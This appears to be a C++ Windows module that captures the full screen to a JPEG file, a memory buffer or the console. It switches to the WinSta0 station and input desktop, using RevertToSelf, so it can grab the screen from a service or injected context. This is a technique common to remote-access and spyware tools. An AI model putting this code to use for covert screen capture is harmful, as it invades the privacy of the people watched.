/*
 * Author: thirdstormofcythraul@outlook.com
 */
#include "screen.h"

#include <Windows.h>

extern "C" {
#include "bmp2jpeg.h"
}
#pragma comment(lib, "jpeg.lib")
#include "macro.h"

#include "memory_debug.h"

bool Screen::screenshot(const char *filename){
	DWORD i = 0;
	return takeScreenshot(2, filename, 0, i);
}

bool Screen::screenshotToConsole(){
	DWORD i = 0;
	return takeScreenshot(1, 0, 0, i);
}

bool Screen::screenshotToBuffer(char **buffer, DWORD &size){
	return takeScreenshot(3, 0, buffer, size);
}

// outType = 1 : console, 2: file, 3: buffer
bool Screen::takeScreenshot(const int outType, const char *filename, char **buffer, DWORD &size){
	if (outType < 1 || outType > 3){
		return false;
	}
	bool result = false;
	HBITMAP handleBitmapScreen = 0;
	HDC handleMemoryDC = 0;
	HWND  hWnd = 0;
	HDC handleDeviceContextOfWindow = 0;


		// open the WinSta0 as some services are attached to a different window station.
	HWINSTA hWindowStation = hWindowStation = OpenWindowStation( "WinSta0", FALSE, WINSTA_ALL_ACCESS );
	if( !hWindowStation )
	{
		if( RevertToSelf() )
			hWindowStation = OpenWindowStation( "WinSta0", FALSE, WINSTA_ALL_ACCESS );
	}
		
	// if we cant open the defaut input station we wont be able to take a screenshot
	if( !hWindowStation ) {
		MYPRINTF( "[SCREENSHOT] screenshot: Couldnt get the WinSta0 Window Station");
		return false;
	}
		
	// get the current process's window station so we can restore it later on.
	HWINSTA hOrigWindowStation = GetProcessWindowStation();
		
	// set the host process's window station to this sessions default input station we opened
	if( !SetProcessWindowStation( hWindowStation ) ){
		MYPRINTF( "[SCREENSHOT] screenshot: SetProcessWindowStation failed" );
		return false;
	}

	// grab a handle to the default input desktop (e.g. Default or WinLogon)
	
	//HDESK hInputDesktop = OpenDesktop("Default", 0, FALSE, MAXIMUM_ALLOWED );
	HDESK hInputDesktop = OpenInputDesktop( 0, FALSE, MAXIMUM_ALLOWED );
	if( !hInputDesktop ){
		MYPRINTF( "[SCREENSHOT] screenshot: OpenInputDesktop failed" );
		return false;
	}
	//if (SwitchDesktop(hInputDesktop) == 0){
	//	MYPRINTF( "[SCREENSHOT] screenshot: SwitchDesktop failed" );
	//	return false;
	//}
	// get the threads current desktop so we can restore it later on
	HDESK hOrigDesktop = GetThreadDesktop( GetCurrentThreadId() );

	// set this threads desktop to that of this sessions default input desktop on WinSta0
	SetThreadDesktop( hInputDesktop );

	// and now we can grab a handle to this input desktop
	HWND hDesktopWnd = GetDesktopWindow();



	int screenWidth = GetSystemMetrics (SM_CXSCREEN);
	int screenHeight = GetSystemMetrics (SM_CYSCREEN);
	MYPRINTF("width: %d, height: %d\n", screenWidth, screenHeight);
	// Retrieve the handle to a display device context for the client 
	// area of the window. 
	HDC handleDeviceContextOfScreen = GetDC(hDesktopWnd);
	//HDC handleDeviceContextOfScreen = CreateDC("DISPLAY",NULL,NULL,NULL);
	if (handleDeviceContextOfScreen == 0){
		MYPRINTF("GetDC(0) has failed: %d", GetLastError());
		goto done;
	}

	if (outType == 1){// print to console
		//The source DC is the entire screen and the destination DC is the current window (HWND)
		// Get the client area for size calculation
		HWND  hWnd = GetForegroundWindow();

		HDC handleDeviceContextOfWindow = GetDC(hWnd);
		if (handleDeviceContextOfScreen == 0){
			MYPRINTF("GetDC(hWnd) has failed: %d", GetLastError());
			goto done;
		}
		RECT rcClient;
		GetClientRect(hWnd, &rcClient);

		//This is the best stretch mode
		SetStretchBltMode(handleDeviceContextOfWindow, HALFTONE);

		if(!StretchBlt(handleDeviceContextOfWindow, 
			0,0, 
			rcClient.right, rcClient.bottom, 
			handleDeviceContextOfScreen, 
			0,0,
			screenWidth,
			screenHeight,
			SRCCOPY))
		{
			MYPRINTF("StretchBlt has failed: %d", GetLastError());
			goto done;
		}
		result = true;
	} else {
		// Create a compatible DC which is used in a BitBlt from the window DC
		handleMemoryDC = CreateCompatibleDC(handleDeviceContextOfScreen);
		if(!handleMemoryDC) {
			MYPRINTF("CreateCompatibleDC has failed: %d", GetLastError());
			goto done;
		}
		BITMAPINFO		bmpinfo;
		ZeroMemory(&bmpinfo,sizeof(bmpinfo));
		LONG dwWidth = GetDeviceCaps(handleDeviceContextOfScreen, HORZRES);
		LONG dwHeight = GetDeviceCaps(handleDeviceContextOfScreen, VERTRES);
		//dwBPP = GetDeviceCaps(hScreen, BITSPIXEL);
		LONG dwBPP = 24;
		LONG dwNumColors = GetDeviceCaps(handleDeviceContextOfScreen, NUMCOLORS);
		LPVOID			pBits;
		bmpinfo.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
		bmpinfo.bmiHeader.biWidth = dwWidth;
		bmpinfo.bmiHeader.biHeight = dwHeight;
		bmpinfo.bmiHeader.biPlanes = 1;
		bmpinfo.bmiHeader.biBitCount = (WORD) dwBPP;
		bmpinfo.bmiHeader.biCompression = BI_RGB;
		bmpinfo.bmiHeader.biSizeImage = 0;
		bmpinfo.bmiHeader.biXPelsPerMeter = 0;
		bmpinfo.bmiHeader.biYPelsPerMeter = 0;
		bmpinfo.bmiHeader.biClrUsed = dwNumColors;
		bmpinfo.bmiHeader.biClrImportant = dwNumColors;
		handleBitmapScreen = CreateDIBSection(handleDeviceContextOfScreen, &bmpinfo, DIB_PAL_COLORS, &pBits, NULL, 0);

		/**
		// Create a compatible bitmap from the Window DC
		handleBitmapScreen = CreateCompatibleBitmap(handleDeviceContextOfScreen, screenWidth, screenHeight);
		if(!handleBitmapScreen) {
			MYPRINTF("CreateCompatibleBitmap Failed: %d", GetLastError());
			goto done;
		}
		*/
		// Select the compatible bitmap into the compatible memory DC.
		if (SelectObject(handleMemoryDC, handleBitmapScreen) == 0){
			MYPRINTF("SelectObject Failed: %d", GetLastError());
			goto done;
		}

		// Bit block transfer into our compatible memory DC.
		if(!BitBlt(handleMemoryDC, 
			0, 0, 
			screenWidth, screenHeight,
			handleDeviceContextOfScreen,
			0, 0,
			SRCCOPY)) {
				MYPRINTF("BitBlt has failed: %d", GetLastError());
				goto done;
		}
		BITMAP bmpScreen;
		// Get the BITMAP from the HBITMAP
		if (GetObject(handleBitmapScreen, sizeof(BITMAP), &bmpScreen) == 0){
				MYPRINTF("GetObject has failed: %d", GetLastError());
				goto done;
		}

		BITMAPFILEHEADER   bmfHeader;    
		BITMAPINFOHEADER   bi;

		bi.biSize = sizeof(BITMAPINFOHEADER);    
		bi.biWidth = bmpScreen.bmWidth;    
		bi.biHeight = bmpScreen.bmHeight;  
		bi.biPlanes = 1;    
		bi.biBitCount = 32;    
		bi.biCompression = BI_RGB;    
		bi.biSizeImage = 0;  
		bi.biXPelsPerMeter = 0;    
		bi.biYPelsPerMeter = 0;    
		bi.biClrUsed = 0;    
		bi.biClrImportant = 0;

		DWORD dwBmpSize = ((bmpScreen.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmpScreen.bmHeight;

		HANDLE hData = GlobalAlloc(GHND,dwBmpSize); 
		char *bmpdata = (char *)GlobalLock(hData); 

		// Starting with 32-bit Windows, GlobalAlloc and LocalAlloc are implemented as wrapper functions that 
		// call HeapAlloc using a handle to the process's default heap. Therefore, GlobalAlloc and LocalAlloc 
		// have greater overhead than HeapAlloc.
		HANDLE hDIB = GlobalAlloc(GHND,dwBmpSize); 
		char *lpbitmap = (char *)GlobalLock(hDIB);    

		// Gets the "bits" from the bitmap and copies them into a buffer 
		// which is pointed to by lpbitmap.
		//GetDIBits(handleDeviceContextOfWindow, handleBitmapScreen, 0,
		GetDIBits(handleDeviceContextOfScreen, handleBitmapScreen, 0,
			(UINT)bmpScreen.bmHeight,
			lpbitmap,
			(BITMAPINFO *)&bi, DIB_RGB_COLORS);

		// Add the size of the headers to the size of the bitmap to get the total file size
		DWORD dwSizeofDIB = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

		//Offset to where the actual bitmap bits start.
		bmfHeader.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER); 

		//Size of the file
		bmfHeader.bfSize = dwSizeofDIB; 

		//bfType must always be BM for Bitmaps
		bmfHeader.bfType = 0x4D42; //BM   

		DWORD dwBytesWritten = 0;


		UINT mybmpsize = dwBmpSize + sizeof(bi) + sizeof(bmfHeader);


		// put headers together to make a .bmp in memory
		memcpy(bmpdata, &bmfHeader, sizeof(bmfHeader));
		memcpy(bmpdata + sizeof(bmfHeader), &bi, sizeof(bi));
		memcpy(bmpdata + sizeof(bmfHeader) + sizeof(bi), lpbitmap, dwBmpSize);

		if (outType == 2){
			// Now convert to JPEG
			if (bmp2jpegtofile((PBYTE)bmpdata, 70, filename ) == 0){
				MYPRINTF("unable to write jpg");
			} else {
				result = true;
			}
		} else {
			if (bmp2jpegtomemory((PBYTE)bmpdata, 70, (BYTE **)buffer, &size) == 0){
				MYPRINTF("unable to write jpg");
			} else {
				result = true;
			}
		}

		//Unlock and Free the DIB from the heap
		GlobalUnlock(hDIB);    
		GlobalFree(hDIB);

		GlobalUnlock(hData);    
		GlobalFree(hData);

	}
	//Clean up
done:
		// restore the origional process's window station
	if( hOrigWindowStation )
		SetProcessWindowStation( hOrigWindowStation );

	// restore the threads origional desktop
	if( hOrigDesktop )
		SetThreadDesktop( hOrigDesktop );

	// close the WinSta0 window station handle we opened
	if( hWindowStation )
		CloseWindowStation( hWindowStation );

	// close this last to avoid a handle leak...
	if( hInputDesktop )
		CloseDesktop( hInputDesktop );

	DeleteObject(handleBitmapScreen);
	DeleteObject(handleMemoryDC);
	ReleaseDC(NULL,handleDeviceContextOfScreen);
	ReleaseDC(hWnd,handleDeviceContextOfWindow);

	return result;

}